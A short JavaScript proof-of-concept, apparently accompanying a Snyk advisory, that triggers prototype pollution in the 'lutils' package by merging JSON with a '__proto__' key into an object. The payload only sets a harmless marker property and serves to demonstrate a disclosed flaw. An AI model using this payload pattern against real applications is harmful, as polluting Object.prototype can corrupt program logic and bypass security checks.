//https://security.snyk.io/vuln/SNYK-JS-LUTILS-1311023
 
  const lt = require("lutils");
  let obj = {};
   

  let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  lt.merge({}, EVIL_JSON);
// End of file
